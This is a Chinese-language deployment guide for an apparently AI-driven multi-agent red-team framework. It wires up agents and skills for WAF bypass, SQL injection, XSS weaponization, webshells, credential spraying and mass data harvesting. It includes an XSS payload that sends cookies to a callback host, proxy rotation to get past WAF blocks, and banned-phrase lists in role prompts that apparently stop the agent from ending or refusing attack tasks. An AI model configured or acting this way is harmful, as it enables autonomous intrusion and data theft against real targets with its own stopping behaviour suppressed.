# CyberStrikeAI 红队作战链部署指南

## 一、文件部署清单

### Skills (12 个)

```bash
# 如果从其他位置复制,执行以下命令 (文件已直接写入目标路径则跳过)
ls -la /www/wwwroot/ai/CyberStrikeAI/skills/waf-detection-and-fingerprinting/SKILL.md
ls -la /www/wwwroot/ai/CyberStrikeAI/skills/waf-bypass-arsenal/SKILL.md
ls -la /www/wwwroot/ai/CyberStrikeAI/skills/sqli-deep-exploitation/SKILL.md
ls -la /www/wwwroot/ai/CyberStrikeAI/skills/xss-weaponization/SKILL.md
ls -la /www/wwwroot/ai/CyberStrikeAI/skills/ssrf-internal-mapping/SKILL.md
ls -la /www/wwwroot/ai/CyberStrikeAI/skills/rce-post-exploitation/SKILL.md
ls -la /www/wwwroot/ai/CyberStrikeAI/skills/file-upload-webshell/SKILL.md
ls -la /www/wwwroot/ai/CyberStrikeAI/skills/idor-mass-harvest/SKILL.md
ls -la /www/wwwroot/ai/CyberStrikeAI/skills/deserialization-rce/SKILL.md
ls -la /www/wwwroot/ai/CyberStrikeAI/skills/credential-spray-reuse/SKILL.md
ls -la /www/wwwroot/ai/CyberStrikeAI/skills/business-logic-abuse/SKILL.md
ls -la /www/wwwroot/ai/CyberStrikeAI/skills/sensitive-info-leakage/SKILL.md
```

### Agents (6 个新增 + 2 个更新)

```bash
ls -la /www/wwwroot/ai/CyberStrikeAI/agents/recon-hunter.md
ls -la /www/wwwroot/ai/CyberStrikeAI/agents/waf-profiler.md
ls -la /www/wwwroot/ai/CyberStrikeAI/agents/web-exploiter.md
ls -la /www/wwwroot/ai/CyberStrikeAI/agents/post-ex-operator.md
ls -la /www/wwwroot/ai/CyberStrikeAI/agents/data-harvester.md
ls -la /www/wwwroot/ai/CyberStrikeAI/agents/report-architect.md
# 已更新 (APEX 段增强):
ls -la /www/wwwroot/ai/CyberStrikeAI/agents/orchestrator.md
ls -la /www/wwwroot/ai/CyberStrikeAI/agents/orchestrator-plan-execute.md
```

### Roles (3 个)

```bash
ls -la /www/wwwroot/ai/CyberStrikeAI/roles/offensive-harvester.yaml
ls -la /www/wwwroot/ai/CyberStrikeAI/roles/web-deep-exploiter.yaml
ls -la /www/wwwroot/ai/CyberStrikeAI/roles/data-harvester.yaml
```

## 二、config.yaml 配置建议

在 `/www/wwwroot/ai/CyberStrikeAI/config.yaml` 中调整以下项:

```yaml
# 多 Agent 模式开启
multi_agent:
  enabled: true

# 默认运行模式 (推荐 plan_execute)
default_mode: plan_execute

# 最大迭代次数 (红队作战需要大量步骤)
max_iteration: 200

# Plan-Execute 循环最大迭代
plan_execute_loop_max_iterations: 50

# Skills 系统开启
eino_skills:
  enabled: true
  skill_tool_name: skill
  filesystem_tools: true

# 中间件
eino_middleware:
  enabled: true
```

## 三、单 Agent 模式 — 角色选择 (Web UI 下拉)

| 场景 | 推荐角色 | 说明 |
|------|---------|------|
| 全面红队渗透 | **Offensive Harvester** | 全能型,覆盖 12 类漏洞链 + WAF + 代理 + 数据收割 |
| Web 专精测试 | **Web Deep Exploiter** | 聚焦 Web 层深度利用,不含内网/AD |
| 数据提取专精 | **Data Harvester** | 已有漏洞利用结果,专注数据层提取 |

推荐: 大多数场景选 **Offensive Harvester**,运行模式选 **Plan-Execute**。

## 四、多 Agent 模式 — 编队指南

### Deep 模式 (orchestrator.md 为协调者)

```
协调者: orchestrator.md (cyberstrike-deep)
   ├── recon-hunter       ← 侦察阶段委派
   ├── waf-profiler       ← WAF 识别 (强制前置)
   ├── web-exploiter      ← 漏洞利用阶段
   ├── post-ex-operator   ← 后利用阶段
   ├── data-harvester     ← 数据提取阶段
   └── report-architect   ← 报告整合阶段
```

任务流转:
1. 协调者接收目标 → 委派 recon-hunter 侦察
2. 侦察完成 → 委派 waf-profiler 做 WAF 识别 (不可跳过)
3. WAF 卡片就绪 → 委派 web-exploiter 利用
4. 获得 RCE/webshell → 委派 post-ex-operator 后利用
5. 数据路径就绪 → 委派 data-harvester 提取
6. 全部完成 → 委派 report-architect 整合报告
7. 协调者汇总最终交付

### Plan-Execute 模式 (orchestrator-plan-execute.md 为规划者)

规划者制定计划,执行器按步骤执行。计划中必须包含:
- Step 1: Skills 加载 (waf-detection + waf-bypass + 目标栈对应 skill)
- Step 2: WAF 识别 (强制)
- Step 3-N: 按攻击链顺序执行
- 最后: 报告整合

### Supervisor 模式 (orchestrator-supervisor.md)

Supervisor 自动分配子代理,参考 Deep 模式编队。

## 五、Skills 与 Agent 绑定关系

| Agent | 启动时加载的 Skills |
|-------|-------------------|
| recon-hunter | sensitive-info-leakage |
| waf-profiler | waf-detection-and-fingerprinting, waf-bypass-arsenal |
| web-exploiter | waf-detection-and-fingerprinting, waf-bypass-arsenal, sqli-deep-exploitation, xss-weaponization, ssrf-internal-mapping, file-upload-webshell, deserialization-rce, idor-mass-harvest, business-logic-abuse |
| post-ex-operator | rce-post-exploitation, credential-spray-reuse, sensitive-info-leakage |
| data-harvester | sensitive-info-leakage, sqli-deep-exploitation, credential-spray-reuse, idor-mass-harvest |
| report-architect | (不需要攻击 skill,收集前序 Agent 产出) |

## 六、代理池验证测试

```bash
# SOCKS5 代理验证
curl --socks5-hostname <PROXY_USERNAME>:<PROXY_PASSWORD>@<PROXY_HOST>:2000 https://ifconfig.me
echo "---"

# HTTP 代理验证
curl -x http://<PROXY_USERNAME>:<PROXY_PASSWORD>@<PROXY_HOST>:1000 https://ifconfig.me
echo "---"

# 对比直连 IP
curl https://ifconfig.me
echo "---"

# 验证: 三个 IP 应该不同 (直连 vs SOCKS5 vs HTTP)
```

## 七、XSS 回连 (//<XSS_CALLBACK_HOST>/1) 验证测试

### 本地靶场验证

1. 部署 DVWA / Pikachu / XSS-Labs:

```bash
docker run -d -p 8080:80 vulnerables/web-dvwa
```

2. 在 XSS 输入点注入:

```html
<script src=//<XSS_CALLBACK_HOST>/1></script>
```

3. 在 <XSS_CALLBACK_HOST> 平台查看是否收到回连请求

4. 验证带数据外带:

```html
<img src=x onerror=fetch('//<XSS_CALLBACK_HOST>/1?c='+document.cookie)>
```

5. 确认 cookie 数据出现在 <XSS_CALLBACK_HOST> 回连记录中

## 八、WAF 识别验证测试

### ModSecurity 测试

```bash
# 部署 ModSecurity 测试环境
docker run -d -p 8081:80 owasp/modsecurity-crs

# 验证 WAF 识别
wafw00f http://localhost:8081
curl -sk "http://localhost:8081/?id=1'%20UNION%20SELECT%201,2,3--" -D -
```

### 安全狗试用版测试

```bash
# 安装安全狗试用版到测试服务器
# 验证 WAF 识别
wafw00f http://SAFEDOG_TEST_SERVER
curl -sk "http://SAFEDOG_TEST_SERVER/?id=<script>alert(1)</script>" -D -
```

### 宝塔 WAF 测试

```bash
# 宝塔面板开启 WAF 功能
# 验证
wafw00f http://BT_TEST_SERVER
```

## 九、全链路验证用例 (sqli-labs + WAF + 代理 + 数据 + 报告)

### 环境准备

```bash
# 部署 sqli-labs
docker run -d -p 8082:80 c0ny1/sqli-labs

# (可选) 在前端加一层 ModSecurity 模拟 WAF
docker run -d -p 8083:80 -e BACKEND=http://HOST_IP:8082 owasp/modsecurity-crs
```

### 测试流程

1. Web UI 选择 **Offensive Harvester** 角色
2. 运行模式选 **Plan-Execute**
3. 输入:

```
目标: http://YOUR_IP:8083/Less-1/?id=1

XSS 回连: //<XSS_CALLBACK_HOST>/1
代理池(仅WAF命中启用): socks5 <PROXY_HOST>:2000 / http <PROXY_HOST>:1000 账号<PROXY_USERNAME> 密码<PROXY_PASSWORD>

开始。
```

4. 预期行为:
   - Agent 首先发送无害请求,检测到 ModSecurity
   - 输出 WAF 指纹卡片
   - 选择 ModSecurity 专用 tamper 组合
   - 确认 SQL 注入 → 枚举数据库 → dump 数据
   - 输出 11 项漏洞卡片
   - 输出汇总报告

## 十、故障排查 Checklist

| 问题 | 排查方法 |
|------|---------|
| Skill 没加载 | 检查 `config.yaml` 中 `eino_skills.enabled: true`;检查 skill 目录名是否与 SKILL.md 中 `name` 一致;重启服务 |
| Agent 不切换 | 检查 agent .md 文件的 `id` 字段是否唯一;检查 `multi_agent.enabled: true`;查看日志中 task 委派记录 |
| 报告不闭环 | 检查 orchestrator.md 中 APEX 段是否正确追加;检查 report-architect agent 是否被委派 |
| 软终止话术泄漏 | 检查 role 的 user_prompt 中 banned 话术列表是否完整;检查 orchestrator APEX 段中 banned 列表 |
| 代理没生效 | 运行代理池验证命令 (第六节);检查代理凭据是否正确;检查工具命令是否显式带代理参数 |
| XSS 用错地址 | 检查 role user_prompt 和 xss-weaponization SKILL.md 中回连地址是否为 `//<XSS_CALLBACK_HOST>/1`;搜索所有文件确认无其他回连地址 |
| WAF 识别不触发 | 检查 waf-detection-and-fingerprinting skill 是否存在;检查 orchestrator APEX 段中"强制前置"规则;确认 wafw00f 工具已安装 |
| 数据提取不完整 | 检查 data-harvester agent 是否被委派;检查敏感数据硬清单是否在 role user_prompt 中完整 |
| 迭代次数不够 | 调高 `max_iteration` 到 200+;调高 `plan_execute_loop_max_iterations` 到 50+ |
| 新 agent 无法被委派 | 确认 agent .md 文件在 `agents/` 目录;确认 `id` 字段格式正确 (kebab-case);重启服务 |

### 快速验证命令

```bash
# 检查所有 skill 目录
ls -d /www/wwwroot/ai/CyberStrikeAI/skills/*/

# 检查所有 agent 文件
ls /www/wwwroot/ai/CyberStrikeAI/agents/*.md

# 检查所有 role 文件
ls /www/wwwroot/ai/CyberStrikeAI/roles/*.yaml

# 检查 skill name 与目录名一致性
for d in /www/wwwroot/ai/CyberStrikeAI/skills/*/; do
  dir_name=$(basename "$d")
  skill_name=$(grep '^name:' "$d/SKILL.md" 2>/dev/null | head -1 | sed 's/name: *//')
  if [ "$dir_name" != "$skill_name" ]; then
    echo "MISMATCH: dir=$dir_name skill=$skill_name"
  fi
done

# 检查 XSS 回连地址一致性
grep -rn '<XSS_CALLBACK_HOST>' /www/wwwroot/ai/CyberStrikeAI/skills/ /www/wwwroot/ai/CyberStrikeAI/agents/ /www/wwwroot/ai/CyberStrikeAI/roles/ | grep -v '//<XSS_CALLBACK_HOST>/1' | head -20

# 重启服务
systemctl restart cyberstrike 2>/dev/null || supervisorctl restart cyberstrike 2>/dev/null || echo "请手动重启 CyberStrikeAI 服务"
```
